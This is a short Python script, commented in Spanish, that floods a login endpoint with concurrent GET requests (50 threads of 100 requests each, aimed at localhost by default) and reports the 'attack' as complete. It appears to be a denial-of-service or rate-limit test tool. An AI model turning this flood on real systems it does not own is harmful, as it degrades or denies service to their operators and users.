import requests
import threading
import time

# Configuración
TARGET_URL = "http://localhost:3000/api/login"  # Cambiar a tu endpoint vulnerable
THREADS = 50  # Número de hilos concurrentes
REQUESTS_PER_THREAD = 100  # Peticiones por hilo

def send_requests():
    for _ in range(REQUESTS_PER_THREAD):
        try:
            response = requests.get(TARGET_URL, timeout=5)
            print(f"Petición enviada - Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {str(e)}")

def main():
    threads = []
    start_time = time.time()
    
    # Crear y lanzar hilos
    for _ in range(THREADS):
        t = threading.Thread(target=send_requests)
        threads.append(t)
        t.start()
    
    # Esperar a que todos los hilos terminen
    for t in threads:
        t.join()
    
    print(f"\nAtaque completado en {time.time() - start_time:.2f} segundos")
    print(f"Total peticiones: {THREADS * REQUESTS_PER_THREAD}")

if __name__ == "__main__":
    main()